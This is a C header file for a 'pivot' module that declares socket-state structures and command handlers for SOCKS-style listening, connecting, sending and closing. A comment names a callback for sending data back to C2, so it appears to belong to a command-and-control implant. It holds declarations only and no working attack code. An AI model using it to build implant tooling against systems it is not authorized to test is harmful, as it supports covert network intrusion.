#ifndef PIVOT_H
#define PIVOT_H

#include <stdint.h>
#include <sys/socket.h>

#define SOCKET_READ_MAX 1048576

#define STATE_DEAD    0
#define STATE_READ    1
#define STATE_CONNECT 2

#define LISTEN_NOTREALLY  0 
#define LISTEN_ONEOFF     1

// Callback function type for sending data back to C2
typedef void (*pivot_callback)(const char * buffer, int length, int type);

typedef struct socket_entry {
    uint32_t id;
    int      state;
    int      socket;
    uint32_t ltype;
    uint16_t lport;
    uint64_t start_time;
    uint32_t timeout;
    uint64_t linger_time;
    struct socket_entry * next;
} socket_entry_t;

// Public Functions
void pivot_init();
void pivot_poll(pivot_callback callback);
void pivot_cleanup();

// Command Handlers
void command_listen_socks(const uint8_t * buffer, int length, pivot_callback callback);
void command_connect_socks(const uint8_t * buffer, int length, pivot_callback callback);
void command_send_socks(const uint8_t * buffer, int length);
void command_close_socks(const uint8_t * buffer, int length);

#endif // PIVOT_H
